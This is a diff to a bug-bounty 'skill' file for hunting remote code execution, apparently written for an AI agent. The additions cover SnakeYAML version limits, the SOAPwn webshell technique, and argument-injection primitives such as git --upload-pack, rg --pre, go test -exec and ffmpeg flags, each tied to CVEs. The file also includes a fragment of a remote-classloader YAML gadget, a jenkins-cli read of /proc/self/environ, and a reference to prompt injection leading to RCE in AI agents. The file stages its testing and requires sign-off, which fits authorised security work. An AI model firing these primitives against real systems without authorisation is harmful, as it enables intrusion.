@@ -1,6 +1,6 @@
 ---
 name: hunt-rce
-description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on any target.
+description: Hunting skill for rce vulnerabilities. Built from 87 public bug bounty reports. Use when hunting rce on any target.
 sources: github, hackerone_public
 report_count: 87
 ---
@@ -86,7 +86,8 @@ window.location = userControlled  // URL scheme bypass → JS execution
 | `nomad` in config UI | Template injection → `{{ ... }}` |
 | `syslog-ng` config editable | Config injection → `program()` destination |
 | `collectd` config editable | Plugin exec injection |
-| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` |
+| `SnakeYAML` in classpath | `!!javax.script.ScriptEngineManager [...]` (SnakeYAML < 2.0 only, see below) |
+| .NET Framework SOAP client built from a user-supplied WSDL / service URL | SOAPwn (watchTowr, 2025-12-10): a `file://` URL makes `HttpWebClientProtocol` write the SOAP body to disk (webshell), UNC gives NTLM relay; Barracuda RMM CVE-2025-34392, Ivanti EPM CVE-2025-13659. <https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/> |
 | npm `package.json` internal scope | Dependency confusion |
 | ingress-nginx annotations | Path field regex bypass |
 
@@ -94,14 +95,14 @@ window.location = userControlled  // URL scheme bypass → JS execution
 
 ## Step-by-Step Hunting Methodology
 
-1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.
+1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, argument lists handed to CLI tools (see Argument Injection below), YAML parsers, file paths used in operations, package resolution, and configuration files.
 
 2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.
 
 3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.
 
 4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
-   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
+   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget (dead on SnakeYAML >= 2.0 unless the app opts in with a permissive `TagInspector`)
    - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
    - REXML: submit billion-laughs / quadratic blowup XML
 
@@ -185,7 +186,7 @@ The `new String[]{"...", "..."}` array form avoids shell-quoting issues that bre
 
 **Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `hunt-ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).
 
-### SnakeYAML RCE Gadget
+### SnakeYAML RCE Gadget (SnakeYAML < 2.0; 2.0+ rejects global tags by default via `UnTrustedTagInspector`, so only an app-supplied permissive `TagInspector` revives it)
 ```yaml
 !!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
@@ -276,6 +277,15 @@ java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/enviro
 3. Returns argument-parsing errors verbatim to the client
 
 → same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.
+
+### Argument Injection (dash-prefixed positionals become CLI flags)
+
+No shell metacharacter needed: a value passed as a positional to `git`, `go`, `rg`, `fd` or `ffmpeg` without a `--` separator or a leading-`-` check is parsed as a flag, so metachar filters and "safe command" allowlists do not help. **Stage A (no execution):** send `--help`, `--version` or a bogus `--zzz<canary>` as the value; usage text or an "unknown option" error naming your canary proves the value reaches argv as a flag. Firing any primitive below is **Stage B** (sign-off, `id` only). Sources: Trail of Bits, "Prompt injection to RCE in AI agents" (2025-10-22, <https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/>); Sonar, Jellyfin write-up (<https://www.sonarsource.com/blog/jellyfin-remote-code-execution/>).
+
+- `git fetch` / `clone` / `ls-remote`: `--upload-pack=<cmd>` runs a command. Tekton git resolver `revision` param, CVE-2026-40938 / GHSA-94jr-7pqp-xhcq (fixed 1.0.2 / 1.3.4 / 1.6.2 / 1.9.3 / 1.11.1).
+- `git show --format=... --output=<path>` writes a file that `rg --pre <prog>` then executes; `go test -exec <prog>` and `fd -x <cmd>` execute directly (the Trail of Bits AI-agent chains against allowlisted tools).
+- `ffmpeg`: injected `-i` / `-f` / output args give file read, file write and SSRF. Jellyfin CVE-2026-35033 (GHSA-jh22-fw8w-2v9x, < 10.11.7): unauthenticated `/Videos/{id}/stream` param concatenated into the ffmpeg command line; the advisory states file read, Sonar escalated the write to RCE.
+- Adjacent shape: Jenkins Git Parameter plugin CVE-2025-53652 (<= 439.vb_0e46ca_14534, fixed 444.vca_b_84d3703c2) passed unvalidated ref values to git; VulnCheck exploited it as `$(...)` command injection, so test both shapes on any value that names a git ref.
 
 ### Grep Patterns for Source Review
 ```bash
@@ -481,6 +491,7 @@ Cross-references:
 - `hunt-api-misconfig` (proto-pollution) — Chain 4
 - `hunt-sharepoint` + `hunt-aspnet` — Chain 5
 - `hunt-xxe` — Chain 6
+- `hunt-nextjs` — React2Shell (CVE-2025-55182, CVSS 10.0, disclosed 2025-12-03, CISA KEV 2025-12-05): pre-auth RCE from deserializing an RSC Flight payload POSTed to a Server Function endpoint; `react-server-dom-webpack/-parcel/-turbopack` 19.0.0, 19.1.0, 19.1.1, 19.2.0 (fixed 19.0.1 / 19.1.2 / 19.2.1), reached via Next.js App Router 15.x / 16.x (Pages Router unaffected). Stage A only: find Server Function endpoints (POSTs carrying a `Next-Action` header) and version-gate; the exploitation discipline lives in `hunt-nextjs`. Ref: <https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/>
 
 ---
 
